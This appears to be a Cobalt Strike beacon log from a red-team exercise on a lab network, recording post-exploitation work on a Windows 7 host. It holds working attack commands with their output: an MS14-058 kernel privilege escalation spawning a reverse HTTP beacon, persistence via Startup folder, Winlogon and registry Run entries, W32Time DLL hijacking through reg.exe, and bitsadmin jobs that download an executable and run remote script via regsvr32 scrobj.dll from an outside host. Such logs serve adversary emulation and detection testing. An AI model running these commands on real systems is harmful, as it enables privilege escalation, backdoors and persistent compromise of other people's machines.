02/25 14:39:32 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a *; pid: 6316; os: Windows; version: 6.1; beacon arch: x86 (x64)
02/25 14:39:37 [input] <neo> elevate ms14-058 test
02/25 14:39:37 [task] Tasked beacon to run windows/beacon_http/reverse_http (172.17.2.56:80) via ms14-058
02/25 14:40:25 [checkin] host called home, sent: 104503 bytes
02/25 14:40:26 [output]
received output:
[*] Getting Windows version...
[*] Solving symbols...
[*] Requesting Kernel loaded modules...
[*] pZwQuerySystemInformation required length 43520
[*] Parsing SYSTEM_INFO...
[*] 147 Kernel modules found
[*] Checking module \SystemRoot\system32\ntoskrnl.exe
[*] Good! nt found as ntoskrnl.exe at 0x03c58000
[*] ntoskrnl.exe loaded in userspace at: 40000000
[*] pPsLookupProcessByProcessId in kernel: 0xFFFFF80003FAB1FC
[*] pPsReferencePrimaryToken in kernel: 0xFFFFF80003FAE9D0
[*] Registering class...
[*] Creating window...
[*] Allocating null page...
[*] Getting PtiCurrent...
[*] Good! dwThreadInfoPtr 0xFFFFF900C11F9010
[*] Creating a fake structure at NULL...
[*] Triggering vulnerability...
[!] Executing payload...


02/25 16:21:30 [task] 通过reg命令设置注册表项
02/25 16:21:30 [task] Tasked beacon to make directory c:\RedTeam\
02/25 16:21:30 [task] cd c:\RedTeam\
02/25 16:21:30 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\t1060_001.exe as t1060_001.exe
02/25 16:21:30 [indicator] file: 39c258e67b0132162b1976d0543e81b8 7680 bytes t1060_001.exe
02/25 16:21:30 [task] Tasked beacon to run: C:\RedTeam\t1060_001.exe
02/25 16:22:27 [checkin] host called home, sent: 7798 bytes
02/25 16:49:45 [task] Tasked beacon to make directory c:\RedTeam\
02/25 16:49:45 [task] cd c:\RedTeam\
02/25 16:49:45 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\t1060_recover.exe as t1060_recover.exe
02/25 16:49:45 [indicator] file: fc34c39f7249bc6920a1aba323e1f476 7680 bytes t1060_recover.exe
02/25 16:49:45 [task] Tasked beacon to run: C:\RedTeam\t1060_recover.exe
02/25 16:50:28 [checkin] host called home, sent: 7806 bytes
02/25 16:52:18 [task] 这里请放任意一个不带签名的文件到 c:\Users\a *\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup
02/25 16:52:18 [task] cd c:\Users\a *\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup
02/25 16:52:19 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1060.exe as T1060.exe
02/25 16:52:19 [indicator] file: a5381751f68c2a8419151e1c82773502 169472 bytes T1060.exe
02/25 16:52:28 [checkin] host called home, sent: 169575 bytes
02/25 16:55:20 [task] 这里请放任意一个不带签名的文件到 c:\Users\a *\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup
02/25 16:55:20 [task] cd c:\Users\a *\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup
02/25 16:55:20 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1060.exe as T1060.exe
02/25 16:55:20 [indicator] file: a5381751f68c2a8419151e1c82773502 169472 bytes T1060.exe
02/25 16:55:28 [checkin] host called home, sent: 169575 bytes
02/25 17:25:49 [task] 设置Winlogon 加载项
02/25 17:25:49 [task] Tasked beacon to make directory c:\RedTeam\
02/25 17:25:49 [task] cd c:\RedTeam\
02/25 17:25:49 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1004.exe as T1004.exe
02/25 17:25:49 [indicator] file: 390249d04d25cf9ae63fe8b6ed086593 7680 bytes T1004.exe
02/25 17:25:49 [task] Tasked beacon to run: C:\RedTeam\T1004.exe
02/25 17:26:28 [checkin] host called home, sent: 7790 bytes
02/25 17:30:10 [task] Tasked beacon to make directory c:\RedTeam\
02/25 17:30:10 [task] cd c:\RedTeam\
02/25 17:30:10 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\t1004_recover.exe as t1004_recover.exe
02/25 17:30:10 [indicator] file: 9f5d6fdb5638cdc8797cfc87f2eb4b5e 7680 bytes t1004_recover.exe
02/25 17:30:10 [task] Tasked beacon to run: C:\RedTeam\t1004_recover.exe
02/25 17:30:29 [checkin] host called home, sent: 7806 bytes
02/25 17:30:29 [output]
received output:
操作成功完成。


02/25 17:50:07 [task] cd C:\Windows\System32\
02/25 17:50:07 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe Add HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\W32Time\TimeProviders\NtpClient /v dllname /t REG_SZ /f /D "c:\test.dll"
02/25 17:50:07 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe Add HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\W32Time\TimeProviders\NtpServer  /v dllname /t REG_SZ /f /D "c:\test.dll"
02/25 17:50:29 [checkin] host called home, sent: 455 bytes
02/25 17:50:30 [output]
received output:
操作成功完成。

C:\Windows\System32>

02/25 17:50:30 [output]
received output:
操作成功完成。

C:\Windows\System32>

02/25 17:51:51 [task] Tasked beacon to run: bitsadmin /create addfile
02/25 17:51:51 [task] Tasked beacon to run: bitsadmin /addfile addfile http://172.17.2.57:8080/test_1197.exe  c:\RedTeam\test.exe
02/25 17:51:51 [task] Tasked beacon to run: bitsadmin /RESUME addfile
02/25 17:51:51 [task] Tasked beacon to run: bitsadmin /complete addfile
02/25 17:52:30 [checkin] host called home, sent: 688 bytes
02/25 17:52:44 [output]
received output:

BITSADMIN version 3.0 [ 7.5.7601 ]
BITS administration utility.
(C) Copyright 2000-2006 Microsoft Corp.

BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.

Created job {F536034A-D044-4523-ABA7-4E988D0338B3}.


02/25 17:52:44 [output]
received output:

BITSADMIN version 3.0 [ 7.5.7601 ]
BITS administration utility.
(C) Copyright 2000-2006 Microsoft Corp.

BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.

Added http://172.17.2.57:8080/test_1197.exe -> c:\RedTeam\test.exe to job.


02/25 17:52:44 [output]
received output:

BITSADMIN version 3.0 [ 7.5.7601 ]
BITS administration utility.
(C) Copyright 2000-2006 Microsoft Corp.

BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.

Job resumed.


02/25 17:52:44 [output]
received output:

BITSADMIN version 3.0 [ 7.5.7601 ]
BITS administration utility.
(C) Copyright 2000-2006 Microsoft Corp.

BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.

Job completed.


02/25 18:12:07 [task] Tasked beacon to run: bitsadmin /create backdoor
02/25 18:12:07 [task] Tasked beacon to run: bitsadmin /addfile backdoor %comspec%  %temp%\cmd.exe
02/25 18:12:07 [task] Tasked beacon to run: bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe "/u /s /i:http://172.17.2.57:8080/back.sct scrobj.dll"
02/25 18:12:07 [task] Tasked beacon to run: bitsadmin /Resume backdoor
02/25 18:12:44 [checkin] host called home, sent: 337 bytes
02/25 18:12:55 [output]
received output:

BITSADMIN version 3.0 [ 7.5.7601 ]
BITS administration utility.
(C) Copyright 2000-2006 Microsoft Corp.

BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.

Created job {1B3117EC-A98F-4B95-A86D-9866A29DB496}.


02/25 18:12:55 [output]
received output:

BITSADMIN version 3.0 [ 7.5.7601 ]
BITS administration utility.
(C) Copyright 2000-2006 Microsoft Corp.

BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.

Added C:\Windows\System32\cmd.exe -> C:\Users\a\AppData\Local\Temp\cmd.exe to job.


02/25 18:12:55 [output]
received output:

BITSADMIN version 3.0 [ 7.5.7601 ]
BITS administration utility.
(C) Copyright 2000-2006 Microsoft Corp.

BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.

notification command line set to 'regsvr32.exe' '/u /s /i:http://172.17.2.57:8080/back.sct scrobj.dll'.


02/25 18:12:55 [output]
received output:

BITSADMIN version 3.0 [ 7.5.7601 ]
BITS administration utility.
(C) Copyright 2000-2006 Microsoft Corp.

BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.

Job resumed.


